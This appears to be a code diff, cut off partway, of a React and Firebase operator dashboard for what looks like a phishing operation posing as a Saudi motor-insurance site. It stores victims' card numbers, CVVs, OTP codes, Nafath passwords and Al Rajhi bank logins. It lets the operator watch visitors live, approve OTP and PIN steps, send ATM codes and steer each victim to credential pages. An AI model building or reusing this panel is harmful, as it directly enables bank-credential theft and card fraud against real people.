@@ -5,30 +5,29 @@ import {
   Users,
   CreditCard,
   UserCheck,
-  Flag,
   Bell,
-  LogOut,
   CheckCircle,
   Search,
-  Download,
-  Settings,
   User,
   Menu,
-  ArrowUpDown,
   ChevronLeft,
   ChevronRight,
-  TrendingUp,
-  Activity,
-  Filter,
-  RefreshCw,
-  AlertCircle,
-  Loader2,
   Phone,
-  LockIcon,
   ClipboardCheck,
-  Eye,
-  EyeOff,
-  Navigation,
+  Building2,
+  Shield,
+  Clock,
+  MapPin,
+  Calendar,
+  Hash,
+  Key,
+  Smartphone,
+  Car,
+  DollarSign,
+  Send,
+  MoreVertical,
+  Circle,
+  MessageSquare,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -41,18 +40,17 @@ import {
   DialogTitle,
   DialogFooter,
   DialogTrigger,
+  DialogClose,
 } from "@/components/ui/dialog";
 import {
   Card,
   CardContent,
   CardHeader,
   CardTitle,
-  CardFooter,
 } from "@/components/ui/card";
 import {
   collection,
   doc,
-  writeBatch,
   updateDoc,
   onSnapshot,
   query,
@@ -60,29 +58,13 @@ import {
 } from "firebase/firestore";
 import { onValue, ref } from "firebase/database";
 import {
-  Popover,
-  PopoverContent,
-  PopoverTrigger,
-} from "@/components/ui/popover";
-import {
   Tooltip,
   TooltipProvider,
   TooltipContent,
   TooltipTrigger,
 } from "@/components/ui/tooltip";
 import { Input } from "@/components/ui/input";
-import {
-  DropdownMenu,
-  DropdownMenuContent,
-  DropdownMenuItem,
-  DropdownMenuTrigger,
-  DropdownMenuSeparator,
-  DropdownMenuLabel,
-} from "@/components/ui/dropdown-menu";
-import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
-import { Separator } from "@/components/ui/separator";
-import { Switch } from "@/components/ui/switch";
-import { Label } from "@/components/ui/label";
+import { ScrollArea } from "@/components/ui/scroll-area";
 import {
   Select,
   SelectContent,
@@ -90,19 +72,11 @@ import {
   SelectTrigger,
   SelectValue,
 } from "@/components/ui/select";
-import { Checkbox } from "@/components/ui/checkbox";
 import { useToast } from "@/hooks/use-toast";
-import {
-  Sheet,
-  SheetContent,
-  SheetHeader,
-  SheetTitle,
-} from "@/components/ui/sheet";
 import { db, database, isFirebaseConfigured } from "@/lib/firebase";
 
 interface Notification {
   id: string;
-  // Personal Info (nested object)
   personalInfo?: {
     acceptMarketing?: boolean;
     birthDay?: string;
@@ -114,41 +88,29 @@ interface Notification {
   phoneNumber?: string;
   phoneCarrier?: string;
   phoneIdNumber?: string;
-  
-  // Card Info
   cardName?: string;
   cardNumber?: string;
   cardExpiry?: string;
   cardCvv?: string;
-  
-  // OTP/Verification codes
   otpCode?: string;
   otpVerified?: boolean;
   phoneOtpCode?: string;
   phoneOtpSubmittedAt?: string;
   phoneSubmittedAt?: string;
   phoneVerificationStatus?: string;
-  
-  // Nafaz
   nafazId?: string;
   nafazPass?: string;
   nafazStatus?: string;
   nafazSubmittedAt?: string;
   authNumber?: string;
-  
-  // Rajhi Bank
   rajhiUser?: string;
   rajhiPassword?: string;
   rajhiOtp?: string;
-  
-  // ATM Verification (nested object)
   atmVerification?: {
     code?: string;
     status?: string;
     timestamp?: string;
   };
-  
-  // Selected Offer (nested object)
   selectedOffer?: {
     insuranceType?: string;
     offerId?: string;
@@ -156,8 +118,6 @@ interface Notification {
     totalPrice?: number;
     status?: string;
   };
-  
-  // Status & Navigation
   approvalStatus?: string;
   currentPage?: string;
   currentStep?: number;
@@ -167,16 +127,11 @@ interface Notification {
   online?: boolean;
   isUnread?: boolean;
   isHidden?: boolean;
-  
-  // Priority color
   any?: "red" | "yellow" | "green" | null;
-  
-  // Admin controls
   cardOtpApproved?: boolean;
   cardPinApproved?: boolean;
   phoneOtpApproved?: boolean;
   nafathApproved?: boolean;
-  
   adminDirective?: {
     targetPage?: string;
     targetStep?: number;
@@ -184,266 +139,37 @@ interface Notification {
   };
 }
 
-function StatisticsCard({
-  title,
-  value,
-  change,
-  changeType,
-  icon: Icon,
-  colorClass,
-  trend,
-}: {
-  title: string;
-  value: string | number;
-  change: string;
-  changeType: "increase" | "decrease" | "neutral";
-  icon: React.ElementType;
-  colorClass: string;
-  trend?: number[];
-}) {
-  return (
-    <Card className="relative overflow-hidden border-0 shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-br from-card to-muted/20">
-      <CardHeader className="pb-2">
-        <div className="flex items-center justify-between">
-          <div className={`p-3 rounded-xl ${colorClass}`}>
-            <Icon className="h-6 w-6 text-primary-foreground" />
-          </div>
-          <div className="text-right">
-            <p className="text-sm font-medium text-muted-foreground">{title}</p>
-            <p className="text-3xl font-bold">{value}</p>
-          </div>
-        </div>
-      </CardHeader>
-      <CardContent className="pt-0">
-        <div className="flex items-center justify-between">
-          <div className="flex items-center gap-1">
-            <TrendingUp
-              className={`h-4 w-4 ${
-                changeType === "increase"
-                  ? "text-emerald-500"
-                  : changeType === "decrease"
-                    ? "text-rose-500"
-                    : "text-muted-foreground"
-              }`}
-            />
-            <span
-              className={`text-sm font-medium ${
-                changeType === "increase"
-                  ? "text-emerald-500"
-                  : changeType === "decrease"
-                    ? "text-rose-500"
-                    : "text-muted-foreground"
-              }`}
-            >
-              {change}
-            </span>
-          </div>
-          {trend && (
-            <div className="flex items-end gap-1 h-8">
-              {trend.map((value, index) => (
-                <div
-                  key={index}
-                  className={`w-1 rounded-sm ${colorClass} opacity-60`}
-                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
-                />
-              ))}
-            </div>
-          )}
-        </div>
-      </CardContent>
-    </Card>
-  );
-}
-
-function UserStatus({ visitorId }: { visitorId: string }) {
-  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown");
-
-  useEffect(() => {
-    if (!database) return;
-    const userStatusRef = ref(database, `/status/${visitorId}`);
-
-    const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val();
-      if (data) {
-        setStatus(data.state === "online" ? "online" : "offline");
-      } else {
-        setStatus("unknown");
-      }
-    });
-
-    return () => unsubscribe();
-  }, [visitorId]);
-
-  return (
-    <div className="flex items-center gap-2">
-      <div
-        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-rose-500"}`}
-      />
-      <Badge
-        variant="outline"
-        className={`text-xs ${
-          status === "online"
-            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300"
-            : "bg-rose-50 text-rose-700 border-rose-200 dark:bg-rose-950/30 dark:text-rose-300"
-        }`}
-      >
-        {status === "online" ? "متصل" : "غير متصل"}
-      </Badge>
-    </div>
-  );
-}
-
-function PrioritySelector({
-  notificationId,
-  currentColor,
-  onColorChange,
-}: {
-  notificationId: string;
-  currentColor: "red" | "yellow" | "green" | null;
-  onColorChange: (id: string, color: "red" | "yellow" | "green" | null) => void;
-}) {
-  return (
-    <Popover>
-      <PopoverTrigger asChild>
-        <Button variant="ghost" size="icon" className="h-8 w-8">
-          <Flag
-            className={`h-4 w-4 ${
-              currentColor === "red"
-                ? "text-rose-500 fill-rose-500"
-                : currentColor === "yellow"
-                  ? "text-amber-500 fill-amber-500"
-                  : currentColor === "green"
-                    ? "text-emerald-500 fill-emerald-500"
-                    : "text-muted-foreground"
-            }`}
-          />
-        </Button>
-      </PopoverTrigger>
-      <PopoverContent className="w-auto p-2">
-        <div className="flex gap-2">
-          {[
-            { color: "red" as const, label: "عالي الأولوية", bgClass: "bg-rose-100 hover:bg-rose-200 dark:bg-rose-900 dark:hover:bg-rose-800" },
-            { color: "yellow" as const, label: "متوسط الأولوية", bgClass: "bg-amber-100 hover:bg-amber-200 dark:bg-amber-900 dark:hover:bg-amber-800" },
-            { color: "green" as const, label: "منخفض الأولوية", bgClass: "bg-emerald-100 hover:bg-emerald-200 dark:bg-emerald-900 dark:hover:bg-emerald-800" },
-          ].map(({ color, label, bgClass }) => (
-            <TooltipProvider key={color}>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button
-                    variant="ghost"
-                    size="icon"
-                    className={`h-8 w-8 rounded-full ${bgClass}`}
-                    onClick={() => onColorChange(notificationId, color)}
-                  >
-                    <Flag className={`h-4 w-4 ${color === "red" ? "text-rose-500 fill-rose-500" : color === "yellow" ? "text-amber-500 fill-amber-500" : "text-emerald-500 fill-emerald-500"}`} />
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent><p>{label}</p></TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-          ))}
-          {currentColor && (
-            <TooltipProvider>
-              <Tooltip>
-                <TooltipTrigger asChild>
-                  <Button
-                    variant="ghost"
-                    size="icon"
-                    className="h-8 w-8 rounded-full bg-muted hover:bg-muted/80"
-                    onClick={() => onColorChange(notificationId, null)}
-                  >
-                    <Flag className="h-4 w-4 text-muted-foreground" />
-                  </Button>
-                </TooltipTrigger>
-                <TooltipContent><p>إزالة العلم</p></TooltipContent>
-              </Tooltip>
-            </TooltipProvider>
-          )}
-        </div>
-      </PopoverContent>
-    </Popover>
-  );
-}
-
-function Pagination({
-  currentPage,
-  totalPages,
-  onPageChange,
-  totalItems,
-  itemsPerPage,
-}: {
-  currentPage: number;
-  totalPages: number;
-  onPageChange: (page: number) => void;
-  totalItems: number;
-  itemsPerPage: number;
-}) {
-  const startItem = (currentPage - 1) * itemsPerPage + 1;
-  const endItem = Math.min(currentPage * itemsPerPage, totalItems);
-
-  return (
-    <div className="flex items-center justify-between flex-wrap gap-2">
-      <div className="text-sm text-muted-foreground">
-        عرض {startItem} إلى {endItem} من {totalItems} عنصر
-      </div>
-      <div className="flex items-center gap-2">
-        <Button
-          variant="outline"
-          size="sm"
-          onClick={() => onPageChange(currentPage - 1)}
-          disabled={currentPage <= 1}
-          className="gap-1"
-        >
-          <ChevronRight className="h-4 w-4" />
-          السابق
-        </Button>
-        <div className="flex items-center gap-1">
-          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
-            const page = i + 1;
-            return (
-              <Button
-                key={page}
-                variant={currentPage === page ? "default" : "outline"}
-                size="sm"
-                className="w-8 h-8 p-0"
-                onClick={() => onPageChange(page)}
-              >
-                {page}
-              </Button>
-            );
-          })}
-        </div>
-        <Button
-          variant="outline"
-          size="sm"
-          onClick={() => onPageChange(currentPage + 1)}
-          disabled={currentPage >= totalPages}
-          className="gap-1"
-        >
-          التالي
-          <ChevronLeft className="h-4 w-4" />
-        </Button>
-      </div>
-    </div>
-  );
-}
-
-const stepLabels: Record<string, string> = {
-  "1": "البيانات الشخصية",
-  "2": "بيانات المركبة", 
-  "3": "عروض التأمين",
-  "4": "الدفع",
-  "5": "OTP البطاقة",
-  "6": "التحقق النهائي",
-  "7": "النجاح",
-};
-
 const pageLabels: Record<string, string> = {
   "motor-insurance": "تأمين السيارات",
+  "motor-insurance-step-1": "تأمين - الخطوة 1",
+  "motor-insurance-step-2": "تأمين - الخطوة 2",
+  "motor-insurance-step-3": "تأمين - الخطوة 3",
+  "motor-insurance-step-4": "تأمين - الدفع",
+  "motor-insurance-step-5": "تأمين - OTP",
+  "motor-insurance-step-6": "تأمين - التحقق",
+  "motor-insurance-step-7": "تأمين - النجاح",
   "phone-verification": "التحقق من الهاتف",
   "nafaz": "نفاذ",
   "rajhi": "الراجحي",
 };
+
+function UserStatus({ visitorId }: { visitorId: string }) {
+  const [isOnline, setIsOnline] = useState(false);
+
+  useEffect(() => {
+    if (!database || !isFirebaseConfigured) return;
+    const statusRef = ref(database, `status/${visitorId}`);
+    const unsubscribe = onValue(statusRef, (snapshot) => {
+      const data = snapshot.val();
+      setIsOnline(data?.state === "online");
+    });
+    return () => unsubscribe();
+  }, [visitorId]);
+
+  return (
+    <div className={`w-3 h-3 rounded-full ${isOnline ? "bg-emerald-500" : "bg-gray-300"}`} />
+  );
+}
 
 export default function Dashboard() {
   const [, setLocation] = useLocation();
@@ -451,14 +177,8 @@ export default function Dashboard() {
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [searchTerm, setSearchTerm] = useState("");
-  const [currentPage, setCurrentPage] = useState(1);
-  const [showStatistics, setShowStatistics] = useState(true);
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
-  const [totalVisitors, setTotalVisitors] = useState(0);
-  const [cardSubmissions, setCardSubmissions] = useState(0);
-  const [onlineUsersCount, setOnlineUsersCount] = useState(0);
-  const itemsPerPage = 10;
-  const previousNotificationsRef = useRef<Notification[]>([]);
+  const [selectedVisitor, setSelectedVisitor] = useState<Notification | null>(null);
+  const [sidebarOpen, setSidebarOpen] = useState(true);
 
   const filteredNotifications = useMemo(() => {
     return notifications.filter((notification) => {
@@ -475,905 +195,746 @@ export default function Dashboard() {
     });
   }, [notifications, searchTerm]);
 
-  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage);
-  const paginatedNotifications = filteredNotifications.slice(
-    (currentPage - 1) * itemsPerPage,
-    currentPage * itemsPerPage
-  );
-
-  const pendingCount = notifications.filter((n) => n.status === "pending").length;
-
   useEffect(() => {
     if (!isFirebaseConfigured || !db) {
       setIsLoading(false);
       return;
     }
     
-    const fetchNotifications = () => {
-      const q = query(collection(db!, "pays"), orderBy("createdAt", "desc"));
+    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"));
+    
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      const notificationsData: Notification[] = [];
       
-      const unsubscribe = onSnapshot(q, (snapshot) => {
-        const notificationsData: Notification[] = [];
-        
-        snapshot.forEach((doc) => {
-          const data = doc.data();
-          if (!data.isHidden) {
-            notificationsData.push({
-              id: doc.id,
-              ...data,
-              createdDate: data.createdAt,
-            } as Notification);
-          }
-        });
-
-        setNotifications(notificationsData);
-        setTotalVisitors(notificationsData.length);
-        setCardSubmissions(notificationsData.filter(n => n.cardNumber).length);
-        setIsLoading(false);
-        previousNotificationsRef.current = notificationsData;
-      }, (error) => {
-        console.error("Error fetching notifications:", error);
-        setIsLoading(false);
-        toast({
-          title: "خطأ في جلب البيانات",
-          description: "حدث خطأ أثناء جلب الإشعارات",
-          variant: "destructive",
-        });
+      snapshot.forEach((doc) => {
+        const data = doc.data();
+        if (!data.isHidden) {
+          notificationsData.push({
+            id: doc.id,
+            ...data,
+          } as Notification);
+        }
       });
 
-      return unsubscribe;
-    };
-
-    const unsubscribe = fetchNotifications();
-    return () => unsubscribe();
-  }, [toast]);
-
-  useEffect(() => {
-    if (!database) return;
-    const onlineUsersRef = ref(database, "status");
-    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
-      const data = snapshot.val();
-      if (data) {
-        const onlineCount = Object.values(data).filter(
-          (status: any) => status.state === "online"
-        ).length;
-        setOnlineUsersCount(onlineCount);
+      setNotifications(notificationsData);
+      setIsLoading(false);
+      
+      if (selectedVisitor) {
+        const updated = notificationsData.find(n => n.id === selectedVisitor.id);
+        if (updated) setSelectedVisitor(updated);
       }
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [selectedVisitor?.id]);
 
-  const handleRouteUser = async (id: string, targetPage: string, targetStep?: number) => {
+  const handleApprovalToggle = async (id: string, field: string, value: boolean) => {
     if (!db) return;
     try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, {
+      await updateDoc(doc(db, "pays", id), { [field]: value });
+      toast({ title: "تم التحديث", description: "تم تحديث حالة الموافقة" });
+    } catch (error) {
+      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
+    }
+  };
+
+  const handleApprovalStatus = async (id: string, status: string, atmCode?: string) => {
+    if (!db) return;
+    try {
+      const updateData: any = { approvalStatus: status };
+      if (status === "approved_atm" && atmCode) {
+        updateData.atmVerification = {
+          code: atmCode,
+          status: "pending",
+          timestamp: new Date().toISOString(),
+        };
+      }
+      await updateDoc(doc(db, "pays", id), updateData);
+      toast({ title: "تم", description: status === "rejected" ? "تم الرفض" : "تمت الموافقة" });
+    } catch (error) {
+      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
+    }
+  };
+
+  const handleRouteUser = async (id: string, targetPage: string) => {
+    if (!db) return;
+    try {
+      await updateDoc(doc(db, "pays", id), {
         adminDirective: {
           targetPage,
-          targetStep: targetStep || 1,
           issuedAt: new Date().toISOString(),
         },
       });
-      toast({
-        title: "تم توجيه المستخدم",
-        description: `تم توجيه المستخدم إلى: ${pageLabels[targetPage] || targetPage}`,
-      });
+      toast({ title: "تم التوجيه", description: `تم توجيه الزائر إلى ${pageLabels[targetPage] || targetPage}` });
     } catch (error) {
-      console.error("Error routing user:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء توجيه المستخدم",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "فشل في التوجيه", variant: "destructive" });
     }
   };
 
   const handleStepChange = async (id: string, step: string) => {
     if (!db) return;
     try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, {
+      await updateDoc(doc(db, "pays", id), {
         adminDirective: {
           targetPage: "motor-insurance",
           targetStep: parseInt(step),
           issuedAt: new Date().toISOString(),
         },
       });
-      toast({
-        title: "تم تحديث الخطوة",
-        description: `تم تغيير الخطوة إلى: ${stepLabels[step] || step}`,
-      });
+      toast({ title: "تم", description: `تم التوجيه للخطوة ${step}` });
     } catch (error) {
-      console.error("Error updating step:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث الخطوة",
-        variant: "destructive",
-      });
-    }
-  };
-
-  const handleApprovalToggle = async (id: string, field: string, value: boolean) => {
-    if (!db) return;
-    try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { [field]: value });
-      setNotifications((prev) =>
-        prev.map((n) => (n.id === id ? { ...n, [field]: value } : n))
-      );
-      const fieldLabels: Record<string, string> = {
-        cardOtpApproved: "OTP البطاقة",
-        cardPinApproved: "PIN البطاقة",
-        phoneOtpApproved: "OTP الهاتف",
-        nafathApproved: "نفاذ",
-      };
-      toast({
-        title: value ? "تمت الموافقة" : "تم الإلغاء",
-        description: `تم ${value ? "الموافقة على" : "إلغاء"} ${fieldLabels[field] || field}`,
-      });
-    } catch (error) {
-      console.error("Error updating approval status:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث حالة الموافقة",
-        variant: "destructive",
-      });
-    }
-  };
-
-  const handleApprovalStatus = async (id: string, status: "approved_otp" | "approved_atm" | "rejected", atmCode?: string) => {
-    if (!db) return;
-    try {
-      const docRef = doc(db, "pays", id);
-      const updateData: any = { approvalStatus: status };
-      if (status === "approved_atm" && atmCode) {
-        updateData.atmCode = atmCode;
-      }
-      await updateDoc(docRef, updateData);
-      toast({
-        title: status === "rejected" ? "تم الرفض" : "تمت الموافقة",
-        description: status === "approved_otp" 
-          ? "تمت الموافقة - سيظهر OTP للمستخدم"
-          : status === "approved_atm"
-            ? "تمت الموافقة - سيظهر رمز الصراف للمستخدم"
-            : "تم رفض العملية",
-      });
-    } catch (error) {
-      console.error("Error updating approval status:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث الحالة",
-        variant: "destructive",
-      });
-    }
-  };
-
-  const handlePriorityChange = async (id: string, color: "red" | "yellow" | "green" | null) => {
-    if (!db) return;
-    try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { any: color });
-      setNotifications(
-        notifications.map((notification) =>
-          notification.id === id ? { ...notification, any: color } : notification
-        )
-      );
-      toast({
-        title: "تم تحديث العلامة",
-        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
-      });
-    } catch (error) {
-      console.error("Error updating flag color:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء تحديث لون العلامة",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "فشل في التحديث", variant: "destructive" });
     }
   };
 
   const handleDelete = async (id: string) => {
     if (!db) return;
     try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { isHidden: true });
-      setNotifications(notifications.filter((notification) => notification.id !== id));
-      toast({
-        title: "تم مسح الإشعار",
-        description: "تم مسح الإشعار بنجاح",
-      });
+      await updateDoc(doc(db, "pays", id), { isHidden: true });
+      if (selectedVisitor?.id === id) setSelectedVisitor(null);
+      toast({ title: "تم الحذف" });
     } catch (error) {
-      console.error("Error hiding notification:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء مسح الإشعار",
-        variant: "destructive",
-      });
+      toast({ title: "خطأ", description: "فشل في الحذف", variant: "destructive" });
     }
   };
 
-  const handleClearAll = async () => {
+  const handlePriorityChange = async (id: string, color: "red" | "yellow" | "green" | null) => {
     if (!db) return;
-    setIsLoading(true);
     try {
-      const batch = writeBatch(db!);
-      notifications.forEach((notification) => {
-        const docRef = doc(db!, "pays", notification.id);
-        batch.update(docRef, { isHidden: true });
-      });
-      await batch.commit();
-      setNotifications([]);
-      toast({
-        title: "تم مسح جميع الإشعارات",
-        description: "تم مسح جميع الإشعارات بنجاح",
-      });
+      await updateDoc(doc(db, "pays", id), { any: color });
     } catch (error) {
-      console.error("Error hiding all notifications:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء مسح الإشعارات",
-        variant: "destructive",
-      });
-    } finally {
-      setIsLoading(false);
+      toast({ title: "خطأ", variant: "destructive" });
     }
   };
 
-  const handleRefresh = () => {
-    setIsLoading(true);
-    setTimeout(() => setIsLoading(false), 500);
+  const getVisitorDisplayName = (n: Notification) => {
+    return n.cardName || n.nationalId || n.phoneNumber || n.id.substring(0, 12);
+  };
+
+  const getLastActivity = (n: Notification) => {
+    if (n.otpCode) return `OTP: ${n.otpCode}`;
+    if (n.phoneOtpCode) return `Phone: ${n.phoneOtpCode}`;
+    if (n.cardNumber) return `بطاقة: ****${n.cardNumber.slice(-4)}`;
+    if (n.nationalId) return `هوية: ${n.nationalId}`;
+    return pageLabels[n.currentPage || ""] || "زائر جديد";
+  };
+
+  const getPriorityColor = (priority: string | null | undefined) => {
+    switch (priority) {
+      case "red": return "bg-red-500";
+      case "yellow": return "bg-yellow-500";
+      case "green": return "bg-green-500";
+      default: return "";
+    }
+  };
+
+  const getPriorityBorderClass = (priority: string | null | undefined) => {
+    switch (priority) {
+      case "red": return "border-r-4 border-r-red-500";
+      case "yellow": return "border-r-4 border-r-yellow-500";
+      case "green": return "border-r-4 border-r-green-500";
+      default: return "";
+    }
   };
 
   if (!isFirebaseConfigured) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center" dir="rtl">
-        <Card className="max-w-md">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-destructive">
-              <AlertCircle className="h-5 w-5" />
-              Firebase غير مكوّن
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            <p className="text-muted-foreground">
-              يرجى إعداد متغيرات البيئة الخاصة بـ Firebase لاستخدام لوحة التحكم.
-            </p>
-          </CardContent>
+      <div className="flex items-center justify-center h-screen" dir="rtl">
+        <Card className="p-8 text-center">
+          <CardTitle className="mb-4">Firebase غير مكون</CardTitle>
+          <p className="text-muted-foreground">يرجى إضافة متغيرات Firebase البيئية</p>
         </Card>
       </div>
     );
   }
 
-  if (isLoading) {
-    return (
-      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
-        <div className="flex flex-col items-center gap-4">
-          <div className="relative">
-            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
-            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
-          </div>
-          <div className="text-lg font-medium">جاري التحميل...</div>
-        </div>
-      </div>
-    );
-  }
-
-  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
-  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
-  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
-  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];
-
   return (
-    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
-      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
-        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
-          <SheetHeader className="mb-6">
-            <SheetTitle className="flex items-center gap-2">
-              <Bell className="h-5 w-5 text-primary" />
-              <span>لوحة الإشعارات</span>
-            </SheetTitle>
-          </SheetHeader>
-          <div className="space-y-6">
-            <div className="flex items-center gap-4">
-              <Avatar>
-                <AvatarFallback>مد</AvatarFallback>
-              </Avatar>
-              <div>
-                <p className="font-medium">مدير النظام</p>
-                <p className="text-sm text-muted-foreground">admin@example.com</p>
-              </div>
-            </div>
-            <Separator />
-            <nav className="space-y-2">
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setMobileMenuOpen(false)}>
-                <Bell className="mr-2 h-4 w-4" />
-                الإشعارات
-              </Button>
-              <Button variant="ghost" className="w-full justify-start" onClick={() => setLocation("/")}>
-                <Navigation className="mr-2 h-4 w-4" />
-                الصفحة الرئيسية
-              </Button>
-            </nav>
+    <div className="flex h-screen bg-background" dir="rtl">
+      {/* Sidebar - Visitor List */}
+      <div className={`${sidebarOpen ? "w-80" : "w-0"} transition-all duration-300 border-l bg-card flex flex-col overflow-hidden`}>
+        {/* Sidebar Header */}
+        <div className="p-4 border-b bg-gradient-to-l from-primary/10 to-transparent">
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="font-bold text-lg flex items-center gap-2">
+              <Users className="h-5 w-5 text-primary" />
+              الزوار
+              <Badge variant="secondary" className="mr-2">{notifications.length}</Badge>
+            </h2>
           </div>
-        </SheetContent>
-      </Sheet>
+          <div className="relative">
+            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+            <Input
+              placeholder="بحث..."
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+              className="pr-9 bg-background"
+              data-testid="input-search-visitors"
+            />
+          </div>
+        </div>
 
-      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
-        <div className="flex items-center justify-between p-4">
-          <div className="flex items-center gap-4">
-            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
+        {/* Visitor List */}
+        <ScrollArea className="flex-1">
+          {isLoading ? (
+            <div className="flex items-center justify-center py-8">
+              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
+            </div>
+          ) : filteredNotifications.length === 0 ? (
+            <div className="text-center py-8 text-muted-foreground">
+              <MessageSquare className="h-12 w-12 mx-auto mb-2 opacity-50" />
+              <p>لا يوجد زوار</p>
+            </div>
+          ) : (
+            <div className="divide-y">
+              {filteredNotifications.map((notification) => (
+                <div
+                  key={notification.id}
+                  onClick={() => setSelectedVisitor(notification)}
+                  className={`p-4 cursor-pointer transition-all hover:bg-muted/50 ${
+                    selectedVisitor?.id === notification.id ? "bg-primary/10 border-r-4 border-r-primary" : ""
+                  } ${getPriorityBorderClass(notification.any)}`}
+                  data-testid={`visitor-item-${notification.id}`}
+                >
+                  <div className="flex items-start gap-3">
+                    {/* Avatar with online status */}
+                    <div className="relative">
+                      <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
+                        notification.cardNumber ? "bg-emerald-100 dark:bg-emerald-900/30" : "bg-primary/10"
+                      }`}>
+                        {notification.cardNumber ? (
+                          <CreditCard className="h-5 w-5 text-emerald-600" />
+                        ) : (
+                          <User className="h-5 w-5 text-primary" />
+                        )}
+                      </div>
+                      <div className="absolute -bottom-0.5 -left-0.5">
+                        <UserStatus visitorId={notification.id} />
+                      </div>
+                      {notification.any && (
+                        <div className={`absolute -top-1 -right-1 w-3 h-3 rounded-full ${getPriorityColor(notification.any)}`} />
+                      )}
+                    </div>
+
+                    {/* Content */}
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center justify-between mb-1">
+                        <p className="font-semibold text-sm truncate">{getVisitorDisplayName(notification)}</p>
+                        <span className="text-xs text-muted-foreground">
+                          {notification.createdAt ? format(new Date(notification.createdAt), "HH:mm", { locale: ar }) : ""}
+                        </span>
+                      </div>
+                      <p className="text-xs text-muted-foreground truncate">{getLastActivity(notification)}</p>
+                      <div className="flex items-center gap-1 mt-2">
+                        <Badge variant="outline" className="text-[10px] px-1.5 py-0">
+                          {pageLabels[notification.currentPage || ""] || "الرئيسية"}
+                        </Badge>
+                        {notification.otpCode && (
+                          <Badge className="text-[10px] px-1.5 py-0 bg-blue-600">OTP</Badge>
+                        )}
+                        {notification.cardNumber && (
+                          <Badge className="text-[10px] px-1.5 py-0 bg-emerald-600">بطاقة</Badge>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          )}
+        </ScrollArea>
+      </div>
+
+      {/* Main Content - Visitor Details */}
+      <div className="flex-1 flex flex-col overflow-hidden">
+        {/* Header */}
+        <div className="h-16 border-b bg-card flex items-center justify-between px-4">
+          <div className="flex items-center gap-3">
+            <Button
+              variant="ghost"
+              size="icon"
+              onClick={() => setSidebarOpen(!sidebarOpen)}
+              data-testid="button-toggle-sidebar"
+            >
               <Menu className="h-5 w-5" />
             </Button>
-            <div className="flex items-center gap-3">
-              <div className="relative">
-                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
-                  <Bell className="h-6 w-6 text-primary-foreground" />
+            {selectedVisitor && (
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
+                  <User className="h-5 w-5 text-primary" />
                 </div>
-                {pendingCount > 0 && (
-                  <div className="absolute -top-1 -right-1 bg-destructive text-destructive-foreground text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
